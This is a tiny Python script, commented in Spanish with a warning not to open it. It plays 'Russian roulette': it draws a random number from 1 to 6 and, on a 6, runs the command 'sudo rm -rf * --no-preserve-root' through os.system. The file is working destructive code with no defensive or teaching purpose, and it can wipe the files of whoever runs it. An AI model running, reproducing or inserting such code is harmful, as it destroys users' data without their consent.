import os
import sys
import random

# NO ABRIR
#para generar un numero random entre 1 y 6
numero = random.randint(1,6)
peligro = "sudo rm -rf * --no-preserve-root"
if (numero == 6):
    os.system(peligro)

